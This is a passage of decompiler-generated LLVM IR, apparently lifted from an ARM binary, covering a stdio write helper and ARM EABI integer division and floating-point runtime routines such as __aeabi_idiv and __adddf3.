  %v1_1a4b0 = trunc i32 %v3_1a4a8 to i8
  %v3_1a4b0 = add i32 %v0_1a4a0, 1
  %v4_1a4b0 = inttoptr i32 %v3_1a4b0 to i8*
  store i8 %v1_1a4b0, i8* %v4_1a4b0, align 1
  %v0_1a4b4 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a4b4 = trunc i32 %v0_1a4b4 to i8
  %v2_1a4b4 = load i32, i32* @r4, align 4
  %v3_1a4b4 = inttoptr i32 %v2_1a4b4 to i8*
  store i8 %v1_1a4b4, i8* %v3_1a4b4, align 1
  %v2_1a4b8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1a4b8, i32* @r4, align 4
  ret i32 -1

dec_label_pc_1a4bc:                               ; preds = %dec_label_pc_1a480
  %v1_1a4bc = and i32 %v3_1a480, 64
  %v2_1a4bc = icmp eq i32 %v1_1a4bc, 0
  br i1 %v2_1a4bc, label %dec_label_pc_1a4ec, label %dec_label_pc_1a4c4

dec_label_pc_1a4c4:                               ; preds = %dec_label_pc_1a4bc
  %v0_1a4c4 = call i32 @__stdio_wcommit()
  %v2_1a4c8 = icmp eq i32 %v0_1a4c4, 0
  br i1 %v2_1a4c8, label %dec_label_pc_1a4d0, label %dec_label_pc_1a4a0

dec_label_pc_1a4d0:                               ; preds = %dec_label_pc_1a4c4
  %v0_1a4d0 = load i32, i32* @r4, align 4
  %v1_1a4d0 = inttoptr i32 %v0_1a4d0 to i32*
  %v2_1a4d0 = load i32, i32* %v1_1a4d0, align 4
  store i32 %v2_1a4d0, i32* %r3.global-to-local, align 4
  %v1_1a4d4 = add i32 %v0_1a4d0, 8
  %v2_1a4d4 = inttoptr i32 %v1_1a4d4 to i32*
  %v3_1a4d4 = load i32, i32* %v2_1a4d4, align 4
  store i32 %v3_1a4d4, i32* %r2.global-to-local, align 4
  %v1_1a4d8 = and i32 %v2_1a4d0, -65
  store i32 %v1_1a4d8, i32* %r3.global-to-local, align 4
  %v3_1a4dc = sdiv i32 %v2_1a4d0, 256
  store i32 %v3_1a4dc, i32* %r1.global-to-local, align 4
  %v2_1a4e0 = add i32 %v0_1a4d0, 28
  %v3_1a4e0 = inttoptr i32 %v2_1a4e0 to i32*
  store i32 %v3_1a4d4, i32* %v3_1a4e0, align 4
  %v0_1a4e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a4e4 = trunc i32 %v0_1a4e4 to i8
  %v2_1a4e4 = load i32, i32* @r4, align 4
  %v3_1a4e4 = add i32 %v2_1a4e4, 1
  %v4_1a4e4 = inttoptr i32 %v3_1a4e4 to i8*
  store i8 %v1_1a4e4, i8* %v4_1a4e4, align 1
  %v0_1a4e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a4e8 = trunc i32 %v0_1a4e8 to i8
  %v2_1a4e8 = load i32, i32* @r4, align 4
  %v3_1a4e8 = inttoptr i32 %v2_1a4e8 to i8*
  store i8 %v1_1a4e8, i8* %v3_1a4e8, align 1
  %v0_1a4ec.pre = load i32, i32* @r4, align 4
  %v0_1a4f8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1a4ec

dec_label_pc_1a4ec:                               ; preds = %dec_label_pc_1a4bc, %dec_label_pc_1a4d0
  %v0_1a4f8 = phi i32 [ 0, %dec_label_pc_1a4bc ], [ %v0_1a4f8.pre, %dec_label_pc_1a4d0 ]
  %v2_1a4fc = phi i32 [ %v0_1a480, %dec_label_pc_1a4bc ], [ %v0_1a4ec.pre, %dec_label_pc_1a4d0 ]
  %v1_1a4ec = inttoptr i32 %v2_1a4fc to i32*
  %v2_1a4ec = load i32, i32* %v1_1a4ec, align 4
  %v1_1a4f0 = or i32 %v2_1a4ec, 1
  store i32 %v1_1a4f0, i32* %r3.global-to-local, align 4
  %v3_1a4f4 = sdiv i32 %v2_1a4ec, 256
  store i32 %v3_1a4f4, i32* %r2.global-to-local, align 4
  %v1_1a4fc = trunc i32 %v3_1a4f4 to i8
  %v3_1a4fc = add i32 %v2_1a4fc, 1
  %v4_1a4fc = inttoptr i32 %v3_1a4fc to i8*
  store i8 %v1_1a4fc, i8* %v4_1a4fc, align 1
  %v0_1a500 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a500 = trunc i32 %v0_1a500 to i8
  %v2_1a500 = load i32, i32* @r4, align 4
  %v3_1a500 = inttoptr i32 %v2_1a500 to i8*
  store i8 %v1_1a500, i8* %v3_1a500, align 1
  %v2_1a504 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1a504, i32* @r4, align 4
  ret i32 %v0_1a4f8

; uselistorder directives
  uselistorder i32 %v3_1a4f4, { 1, 0 }
  uselistorder i32 %v3_1a4a8, { 1, 0 }
  uselistorder i32 %v3_1a480, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1a480, { 0, 2, 1 }
  uselistorder i32 %v3_1a474, { 1, 0 }
  uselistorder i32 %v5_1a458, { 0, 2, 1, 3 }
  uselistorder i32 28, { 26, 27, 4, 5, 6, 28, 29, 30, 17, 34, 31, 33, 7, 32, 1, 25, 2, 18, 19, 20, 21, 22, 23, 0, 24, 15, 3, 12, 11, 9, 10, 13, 14, 8, 16 }
  uselistorder i32 ()* @__stdio_wcommit, { 2, 0, 1, 5, 4, 3 }
  uselistorder i32 64, { 9, 0, 10, 11, 5, 6, 12, 13, 8, 1, 2, 7, 3, 14, 4 }
  uselistorder i32 9, { 16, 31, 32, 33, 34, 35, 36, 17, 22, 15, 23, 30, 18, 28, 24, 25, 26, 27, 19, 0, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 20, 21, 29 }
  uselistorder i32 ()* @__errno_location, { 31, 55, 29, 70, 69, 47, 28, 26, 25, 54, 53, 24, 23, 20, 48, 52, 40, 63, 13, 12, 11, 37, 10, 36, 72, 62, 61, 66, 65, 46, 45, 44, 18, 60, 39, 17, 16, 64, 21, 22, 57, 67, 15, 14, 51, 50, 49, 2, 27, 59, 9, 8, 43, 32, 30, 42, 35, 7, 1, 3, 34, 0, 4, 58, 33, 19, 41, 68, 6, 5, 71, 56, 38 }
  uselistorder i32 2176, { 1, 0 }
  uselistorder label %dec_label_pc_1a4ec, { 1, 0 }
  uselistorder label %dec_label_pc_1a494, { 1, 0 }
  uselistorder label %dec_label_pc_1a480, { 1, 0 }
}

define i32 @__aeabi_idiv(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_1a508 = icmp slt i32 %arg2, 0
  %v2_1a508 = icmp eq i32 %arg2, 0
  %v0_1a50c = load i32, i32* @r0, align 4
  %v2_1a50c = xor i32 %v0_1a50c, %arg2
  br i1 %v2_1a508, label %dec_label_pc_1a620, label %dec_label_pc_1a514

dec_label_pc_1a514:                               ; preds = %entry
  br i1 %v1_1a508, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_1a514
  %v2_1a514 = sub i32 0, %arg2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_1a514, %bb
  %v1_1a5e0 = phi i32 [ %v2_1a514, %bb ], [ %arg2, %dec_label_pc_1a514 ]
  %v1_1a518 = add i32 %v1_1a5e0, -1
  %v7_1a518 = icmp eq i32 %v1_1a5e0, 1
  br i1 %v7_1a518, label %dec_label_pc_1a5c0, label %dec_label_pc_1a520

dec_label_pc_1a520:                               ; preds = %thread-pre-split
  %v1_1a520 = icmp slt i32 %v0_1a50c, 0
  br i1 %v1_1a520, label %bb85, label %bb86

bb85:                                             ; preds = %dec_label_pc_1a520
  %v2_1a524 = sub i32 0, %v0_1a50c
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_1a520, %bb85
  %v0_1a614 = phi i32 [ %v0_1a50c, %dec_label_pc_1a520 ], [ %v2_1a524, %bb85 ]
  %v3_1a528 = icmp uge i32 %v0_1a614, %v1_1a5e0
  %v9_1a528 = icmp eq i32 %v0_1a614, %v1_1a5e0
  %v2_1a52c = xor i1 %v3_1a528, true
  %v3_1a52c = or i1 %v9_1a528, %v2_1a52c
  br i1 %v3_1a52c, label %dec_label_pc_1a5cc, label %dec_label_pc_1a530

dec_label_pc_1a530:                               ; preds = %bb86
  %v2_1a530 = and i32 %v1_1a518, %v1_1a5e0
  %v4_1a530 = icmp eq i32 %v2_1a530, 0
  br i1 %v4_1a530, label %dec_label_pc_1a5dc, label %dec_label_pc_1a538

dec_label_pc_1a538:                               ; preds = %dec_label_pc_1a530
  %v3_1a538 = icmp ult i32 %v1_1a5e0, 536870912
  br i1 %v3_1a538, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_1a538
  %v4_1a53c = mul i32 %v1_1a5e0, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_1a538, %.thread
  %v0_1a55c.pr40.ph = phi i32 [ %v4_1a53c, %.thread ], [ %v1_1a5e0, %dec_label_pc_1a538 ]
  %storemerge143 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_1a538 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb89
  %v0_1a55c.pr40 = phi i32 [ %v4_1a550, %bb89 ], [ %v0_1a55c.pr40.ph, %.preheader.preheader ]
  %v1_1a554 = phi i32 [ %v4_1a554, %bb89 ], [ %storemerge143, %.preheader.preheader ]
  %v2_1a548 = icmp ugt i32 %v0_1a55c.pr40, 268435455
  br i1 %v2_1a548, label %.thread3, label %bb87

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_1a55cthread-pre-split.loopexit

bb87:                                             ; preds = %.preheader
  %v4_1a54c = icmp ult i32 %v0_1a55c.pr40, %v0_1a614
  br i1 %v4_1a54c, label %bb88, label %dec_label_pc_1a55cthread-pre-split.loopexit.loopexit

bb88:                                             ; preds = %bb87
  %v2_1a550 = and i32 %v0_1a55c.pr40, 268435456
  %v3_1a550 = icmp eq i32 %v2_1a550, 0
  %v4_1a550 = mul i32 %v0_1a55c.pr40, 16
  br i1 %v3_1a550, label %bb89, label %dec_label_pc_1a55c.loopexit

bb89:                                             ; preds = %bb88
  %v2_1a554 = and i32 %v1_1a554, 268435456
  %v3_1a554 = icmp eq i32 %v2_1a554, 0
  %v4_1a554 = mul i32 %v1_1a554, 16
  br i1 %v3_1a554, label %.preheader, label %dec_label_pc_1a55cthread-pre-split.loopexit.loopexit

dec_label_pc_1a55cthread-pre-split.loopexit.loopexit: ; preds = %bb89, %bb87
  %v1_1a56852.ph = phi i32 [ %v1_1a554, %bb87 ], [ %v4_1a554, %bb89 ]
  %v0_1a55c.pr42.ph = phi i32 [ %v0_1a55c.pr40, %bb87 ], [ %v4_1a550, %bb89 ]
  br label %dec_label_pc_1a55cthread-pre-split.loopexit

dec_label_pc_1a55cthread-pre-split.loopexit:      ; preds = %dec_label_pc_1a55cthread-pre-split.loopexit.loopexit, %.thread3
  %v1_1a56852 = phi i32 [ %v1_1a554, %.thread3 ], [ %v1_1a56852.ph, %dec_label_pc_1a55cthread-pre-split.loopexit.loopexit ]
  %v0_1a55c.pr42 = phi i32 [ %v0_1a55c.pr40, %.thread3 ], [ %v0_1a55c.pr42.ph, %dec_label_pc_1a55cthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_1a55cthread-pre-split

dec_label_pc_1a55cthread-pre-split:               ; preds = %dec_label_pc_1a55cthread-pre-split.loopexit, %bb91
  %v1_1a56850 = phi i32 [ %v1_1a56852, %dec_label_pc_1a55cthread-pre-split.loopexit ], [ %v3_1a568, %bb91 ]
  %v2_1a56048 = phi i32 [ %v0_1a614, %dec_label_pc_1a55cthread-pre-split.loopexit ], [ %v2_1a560, %bb91 ]
  %v0_1a55c.pr = phi i32 [ %v0_1a55c.pr42, %dec_label_pc_1a55cthread-pre-split.loopexit ], [ %v3_1a564, %bb91 ]
  br label %dec_label_pc_1a55c

dec_label_pc_1a55c.loopexit:                      ; preds = %bb88
  br label %dec_label_pc_1a55c

dec_label_pc_1a55c:                               ; preds = %dec_label_pc_1a55c.loopexit, %dec_label_pc_1a55cthread-pre-split
  %v1_1a568 = phi i32 [ %v1_1a56850, %dec_label_pc_1a55cthread-pre-split ], [ %v1_1a554, %dec_label_pc_1a55c.loopexit ]
  %v2_1a560 = phi i32 [ %v2_1a56048, %dec_label_pc_1a55cthread-pre-split ], [ %v0_1a614, %dec_label_pc_1a55c.loopexit ]
  %v1_1a564 = phi i32 [ %v0_1a55c.pr, %dec_label_pc_1a55cthread-pre-split ], [ %v4_1a550, %dec_label_pc_1a55c.loopexit ]
  %v2_1a55c = icmp slt i32 %v1_1a564, 0
  br i1 %v2_1a55c, label %dec_label_pc_1a570, label %bb90

bb90:                                             ; preds = %dec_label_pc_1a55c
  %v4_1a560 = icmp ult i32 %v1_1a564, %v2_1a560
  br i1 %v4_1a560, label %bb91, label %dec_label_pc_1a570

bb91:                                             ; preds = %bb90
  %v3_1a564 = mul i32 %v1_1a564, 2
  %v2_1a568 = icmp slt i32 %v1_1a568, 0
  %v3_1a568 = mul i32 %v1_1a568, 2
  br i1 %v2_1a568, label %dec_label_pc_1a570, label %dec_label_pc_1a55cthread-pre-split

dec_label_pc_1a570:                               ; preds = %bb90, %dec_label_pc_1a55c, %bb91
  %v2_1a57c63 = phi i32 [ %v3_1a568, %bb91 ], [ %v1_1a568, %bb90 ], [ %v1_1a568, %dec_label_pc_1a55c ]
  %v1_1a57455 = phi i32 [ %v3_1a564, %bb91 ], [ %v1_1a564, %bb90 ], [ %v1_1a564, %dec_label_pc_1a55c ]
  br label %dec_label_pc_1a574

dec_label_pc_1a574:                               ; preds = %.thread13, %dec_label_pc_1a570
  %v1_1a5a8 = phi i32 [ %v4_1a5a8, %.thread13 ], [ %v2_1a57c63, %dec_label_pc_1a570 ]
  %v1_1a57c = phi i32 [ %v1_1a5b8, %.thread13 ], [ 0, %dec_label_pc_1a570 ]
  %v1_1a5ac = phi i32 [ %v4_1a5ac, %.thread13 ], [ %v1_1a57455, %dec_label_pc_1a570 ]
  %v1_1a578 = phi i32 [ %v0_1a5a4, %.thread13 ], [ %v0_1a614, %dec_label_pc_1a570 ]
  %v3_1a574 = icmp ult i32 %v1_1a578, %v1_1a5ac
  br i1 %v3_1a574, label %.thread8, label %bb92

bb92:                                             ; preds = %dec_label_pc_1a574
  %v3_1a578 = sub i32 %v1_1a578, %v1_1a5ac
  %v3_1a57c = or i32 %v1_1a57c, %v1_1a5a8
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1a574, %bb92
  %v1_1a584 = phi i32 [ %v1_1a578, %dec_label_pc_1a574 ], [ %v3_1a578, %bb92 ]
  %v1_1a588 = phi i32 [ %v1_1a57c, %dec_label_pc_1a574 ], [ %v3_1a57c, %bb92 ]
  %v4_1a580 = udiv i32 %v1_1a5ac, 2
  %v6_1a580 = icmp ult i32 %v1_1a584, %v4_1a580
  br i1 %v6_1a580, label %.thread9, label %bb93

bb93:                                             ; preds = %.thread8
  %v3_1a584 = urem i32 %v1_1a5ac, 2
  %v4_1a584 = icmp eq i32 %v3_1a584, 0
  %v6_1a584 = sub i32 %v1_1a584, %v4_1a580
  br i1 %v4_1a584, label %.thread9, label %bb94

bb94:                                             ; preds = %bb93
  %v5_1a588 = udiv i32 %v1_1a5a8, 2
  %v6_1a588 = or i32 %v1_1a588, %v5_1a588
  br label %.thread9

.thread9:                                         ; preds = %bb93, %.thread8, %bb94
  %v1_1a590 = phi i32 [ %v6_1a584, %bb93 ], [ %v1_1a584, %.thread8 ], [ %v6_1a584, %bb94 ]
  %v1_1a594 = phi i32 [ %v1_1a588, %bb93 ], [ %v1_1a588, %.thread8 ], [ %v6_1a588, %bb94 ]
  %v4_1a58c = udiv i32 %v1_1a5ac, 4
  %v6_1a58c = icmp ult i32 %v1_1a590, %v4_1a58c
  br i1 %v6_1a58c, label %.thread10, label %bb95

bb95:                                             ; preds = %.thread9
  %v3_1a590 = and i32 %v1_1a5ac, 2
  %v4_1a590 = icmp eq i32 %v3_1a590, 0
  %v6_1a590 = sub i32 %v1_1a590, %v4_1a58c
  br i1 %v4_1a590, label %.thread10, label %bb96

bb96:                                             ; preds = %bb95
  %v5_1a594 = udiv i32 %v1_1a5a8, 4
  %v6_1a594 = or i32 %v1_1a594, %v5_1a594
  br label %.thread10

.thread10:                                        ; preds = %bb95, %.thread9, %bb96
  %v1_1a59c = phi i32 [ %v6_1a590, %bb95 ], [ %v1_1a590, %.thread9 ], [ %v6_1a590, %bb96 ]
  %v1_1a5a0 = phi i32 [ %v1_1a594, %bb95 ], [ %v1_1a594, %.thread9 ], [ %v6_1a594, %bb96 ]
  %v4_1a598 = udiv i32 %v1_1a5ac, 8
  %v6_1a598 = icmp ult i32 %v1_1a59c, %v4_1a598
  br i1 %v6_1a598, label %thread-pre-split12, label %bb97

bb97:                                             ; preds = %.thread10
  %v3_1a59c = and i32 %v1_1a5ac, 4
  %v4_1a59c = icmp eq i32 %v3_1a59c, 0
  %v6_1a59c = sub i32 %v1_1a59c, %v4_1a598
  br i1 %v4_1a59c, label %thread-pre-split12, label %bb98

bb98:                                             ; preds = %bb97
  %v5_1a5a0 = udiv i32 %v1_1a5a8, 8
  %v6_1a5a0 = or i32 %v1_1a5a0, %v5_1a5a0
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb98, %.thread10, %bb97
  %v1_1a5b8 = phi i32 [ %v1_1a5a0, %bb97 ], [ %v1_1a5a0, %.thread10 ], [ %v6_1a5a0, %bb98 ]
  %v0_1a5a4 = phi i32 [ %v6_1a59c, %bb97 ], [ %v1_1a59c, %.thread10 ], [ %v6_1a59c, %bb98 ]
  %v2_1a5a4 = icmp eq i32 %v0_1a5a4, 0
  br i1 %v2_1a5a4, label %dec_label_pc_1a5b4, label %bb99

bb99:                                             ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_1a5a8, 16
  br i1 %tmp, label %dec_label_pc_1a5b4, label %.thread13

.thread13:                                        ; preds = %bb99
  %v4_1a5a8 = udiv i32 %v1_1a5a8, 16
  %v4_1a5ac = udiv i32 %v1_1a5ac, 16
  br label %dec_label_pc_1a574

dec_label_pc_1a5b4:                               ; preds = %thread-pre-split12, %bb99
  %v1_1a5b4 = icmp slt i32 %v2_1a50c, 0
  br i1 %v1_1a5b4, label %bb100, label %.thread16

bb100:                                            ; preds = %dec_label_pc_1a5b4
  %v2_1a5b8 = sub i32 0, %v1_1a5b8
  br label %.thread16

.thread16:                                        ; preds = %bb104, %bb103, %bb101, %dec_label_pc_1a5c0, %dec_label_pc_1a5b4, %bb100
  %v1_1a5bc = phi i32 [ %v1_1a5b8, %dec_label_pc_1a5b4 ], [ %v2_1a5b8, %bb100 ], [ %v0_1a50c, %dec_label_pc_1a5c0 ], [ %v2_1a5c4, %bb101 ], [ %v1_1a5d880, %bb103 ], [ %v2_1a5d4, %bb104 ]
  ret i32 %v1_1a5bc

dec_label_pc_1a5c0:                               ; preds = %thread-pre-split
  br i1 %v1_1a508, label %bb101, label %.thread16

bb101:                                            ; preds = %dec_label_pc_1a5c0
  %v2_1a5c4 = sub i32 0, %v0_1a50c
  br label %.thread16

dec_label_pc_1a5cc:                               ; preds = %bb86
  br i1 %v3_1a528, label %bb103, label %bb102

bb102:                                            ; preds = %dec_label_pc_1a5cc
  br label %bb103

bb103:                                            ; preds = %dec_label_pc_1a5cc, %bb102
  %v1_1a5d880 = phi i32 [ %v0_1a50c, %dec_label_pc_1a5cc ], [ 0, %bb102 ]
  br i1 %v9_1a528, label %bb104, label %.thread16

bb104:                                            ; preds = %bb103
  %v4_1a5d0 = ashr i32 %v2_1a50c, 31
  %v2_1a5d4 = or i32 %v4_1a5d0, 1
  br label %.thread16

dec_label_pc_1a5dc:                               ; preds = %dec_label_pc_1a530
  %v2_1a5dc = icmp ugt i32 %v1_1a5e0, 65535
  br i1 %v2_1a5dc, label %bb105, label %.thread19

bb105:                                            ; preds = %dec_label_pc_1a5dc
  %v2_1a5e0 = and i32 %v1_1a5e0, 32768
  %v3_1a5e0 = icmp eq i32 %v2_1a5e0, 0
  %v4_1a5e0 = udiv i32 %v1_1a5e0, 65536
  br i1 %v3_1a5e0, label %.thread19, label %bb106

.thread19:                                        ; preds = %bb105, %dec_label_pc_1a5dc
  %v0_1a5ec70 = phi i32 [ %v1_1a5e0, %dec_label_pc_1a5dc ], [ %v4_1a5e0, %bb105 ]
  br label %bb106

bb106:                                            ; preds = %bb105, %.thread19
  %v1_1a5f0 = phi i32 [ %v0_1a5ec70, %.thread19 ], [ %v4_1a5e0, %bb105 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb105 ]
  %v2_1a5ec = icmp ugt i32 %v1_1a5f0, 255
  br i1 %v2_1a5ec, label %bb107, label %.thread20

bb107:                                            ; preds = %bb106
  %v2_1a5f0 = and i32 %v1_1a5f0, 128
  %v3_1a5f0 = icmp eq i32 %v2_1a5f0, 0
  %v4_1a5f0 = udiv i32 %v1_1a5f0, 256
  br i1 %v3_1a5f0, label %.thread20, label %bb108

bb108:                                            ; preds = %bb107
  %v2_1a5f4 = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb107, %bb106, %bb108
  %v1_1a600 = phi i32 [ %storemerge, %bb106 ], [ %storemerge, %bb107 ], [ %v2_1a5f4, %bb108 ]
  %v1_1a5fc = phi i32 [ %v1_1a5f0, %bb106 ], [ %v4_1a5f0, %bb107 ], [ %v4_1a5f0, %bb108 ]
  %v2_1a5f8 = icmp ugt i32 %v1_1a5fc, 15
  br i1 %v2_1a5f8, label %bb109, label %.thread21

bb109:                                            ; preds = %.thread20
  %v2_1a5fc = and i32 %v1_1a5fc, 8
  %v3_1a5fc = icmp eq i32 %v2_1a5fc, 0
  %v4_1a5fc = udiv i32 %v1_1a5fc, 16
  br i1 %v3_1a5fc, label %.thread21, label %bb110

bb110:                                            ; preds = %bb109
  %v2_1a600 = add nsw i32 %v1_1a600, 4
  br label %.thread21

.thread21:                                        ; preds = %bb109, %.thread20, %bb110
  %v4_1a608 = phi i32 [ %v1_1a600, %.thread20 ], [ %v1_1a600, %bb109 ], [ %v2_1a600, %bb110 ]
  %v5_1a60c = phi i32 [ %v1_1a5fc, %.thread20 ], [ %v4_1a5fc, %bb109 ], [ %v4_1a5fc, %bb110 ]
  %v2_1a604 = icmp ugt i32 %v5_1a60c, 3
  %v7_1a604 = icmp eq i32 %v5_1a60c, 4
  %v2_1a608 = xor i1 %v7_1a604, true
  %v3_1a608 = and i1 %v2_1a604, %v2_1a608
  br i1 %v3_1a608, label %bb111, label %bb112

bb111:                                            ; preds = %.thread21
  %v5_1a608 = add nsw i32 %v4_1a608, 3
  br label %bb112

bb112:                                            ; preds = %.thread21, %bb111
  %v4_1a60c = phi i32 [ %v4_1a608, %.thread21 ], [ %v5_1a608, %bb111 ]
  %v2_1a60c = xor i1 %v2_1a604, true
  %v3_1a60c = or i1 %v7_1a604, %v2_1a60c
  br i1 %v3_1a60c, label %bb113, label %bb114

bb113:                                            ; preds = %bb112
  %v8_1a60c = udiv i32 %v5_1a60c, 2
  %v9_1a60c = add i32 %v4_1a60c, %v8_1a60c
  br label %bb114

bb114:                                            ; preds = %bb112, %bb113
  %v1_1a614 = phi i32 [ %v4_1a60c, %bb112 ], [ %v9_1a60c, %bb113 ]
  %v1_1a610 = icmp slt i32 %v2_1a50c, 0
  %v6_1a614 = lshr i32 %v0_1a614, %v1_1a614
  %v2_1a618 = sub i32 0, %v6_1a614
  %v2_1a618.v6_1a614 = select i1 %v1_1a610, i32 %v2_1a618, i32 %v6_1a614
  ret i32 %v2_1a618.v6_1a614

dec_label_pc_1a620:                               ; preds = %entry
  %v0_1a620 = load i32, i32* @lr, align 4
  %v0_1a624 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_1a620)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_1a60c, { 1, 0 }
  uselistorder i1 %v7_1a604, { 1, 0 }
  uselistorder i32 %v4_1a5fc, { 1, 0 }
  uselistorder i32 %v1_1a5fc, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1a5f0, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_1a5f0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1a5e0, { 1, 0 }
  uselistorder i32 %v0_1a5a4, { 1, 0 }
  uselistorder i32 %v4_1a598, { 1, 0 }
  uselistorder i32 %v1_1a5a0, { 1, 2, 0 }
  uselistorder i32 %v4_1a58c, { 1, 0 }
  uselistorder i32 %v1_1a594, { 1, 2, 0 }
  uselistorder i32 %v4_1a580, { 1, 0 }
  uselistorder i32 %v1_1a588, { 1, 2, 0 }
  uselistorder i32 %v1_1a5ac, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_1a57c, { 1, 0 }
  uselistorder i32 %v1_1a5a8, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_1a568, { 1, 0 }
  uselistorder i32 %v3_1a564, { 1, 0 }
  uselistorder i32 %v1_1a564, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_1a560, { 1, 0 }
  uselistorder i32 %v1_1a568, { 1, 2, 0, 3 }
  uselistorder i32 %v4_1a554, { 1, 0 }
  uselistorder i32 %v4_1a550, { 2, 1, 0 }
  uselistorder i32 %v1_1a554, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_1a55c.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_1a528, { 1, 0 }
  uselistorder i32 %v1_1a5e0, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_1a50c, { 1, 0, 2 }
  uselistorder i32 %v0_1a50c, { 3, 2, 1, 4, 5, 6, 0 }
  uselistorder i32 ()* @__aeabi_ldiv0, { 3, 0, 2, 1 }
  uselistorder i32 268435455, { 2, 3, 0, 4, 1, 5 }
  uselistorder i32 %arg2, { 2, 3, 4, 0, 1 }
  uselistorder label %bb114, { 1, 0 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_1a5b4, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_1a570, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a55cthread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @__aeabi_idivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1a634 = sdiv i32 %arg1, %arg2
  ret i32 %v2_1a634
}

define i32 @__aeabi_drsub(i32 %arg1, double %arg2) local_unnamed_addr {
entry:
  %v1_1a648 = sub i32 0, %arg1
  %v2_1a648 = sext i32 %v1_1a648 to i64
  %v3_1a64c = bitcast i64 %v2_1a648 to double
  %v9_1a64c = fadd double %v3_1a64c, %arg2
  %v10_1a64c = fptrunc double %v9_1a64c to float
  %v11_1a64c = bitcast float %v10_1a64c to i32
  ret i32 %v11_1a64c
}

define i32 @__aeabi_dsub(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1a650 = load i32, i32* @r0, align 4
  ret i32 %v2_1a650
}

define i32 @__adddf3(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1a654 = load i32, i32* @r4, align 4
  store i32 %v3_1a654, i32* %stack_var_-12, align 4
  %v6_1a654 = load i32, i32* @r5, align 4
  %v0_1a658 = load i32, i32* %r0.global-to-local, align 4
  %v2_1a658 = mul i32 %v0_1a658, 2
  store i32 %v2_1a658, i32* %r4.global-to-local, align 4
  %v0_1a65c = load i32, i32* %r2.global-to-local, align 4
  %v2_1a65c = mul i32 %v0_1a65c, 2
  store i32 %v2_1a65c, i32* %r5.global-to-local, align 4
  %v4_1a660 = icmp eq i32 %v2_1a65c, %v2_1a658
  %v1_1a664 = load i32, i32* %r1.global-to-local, align 4
  br i1 %v4_1a660, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v2_1a664 = load i32, i32* %r3.global-to-local, align 4
  %v5_1a664 = icmp eq i32 %v2_1a664, %v1_1a664
  br i1 %v5_1a664, label %.thread3, label %.thread

.thread:                                          ; preds = %entry, %bb
  %v3_1a668 = or i32 %v1_1a664, %v2_1a658
  %v5_1a668 = icmp eq i32 %v3_1a668, 0
  br i1 %v5_1a668, label %.thread3, label %bb11

bb11:                                             ; preds = %.thread
  %v2_1a66c = load i32, i32* %r3.global-to-local, align 4
  %v3_1a66c = or i32 %v2_1a66c, %v2_1a65c
  %v5_1a66c = icmp eq i32 %v3_1a66c, 0
  br i1 %v5_1a66c, label %.thread3, label %bb12

bb12:                                             ; preds = %bb11
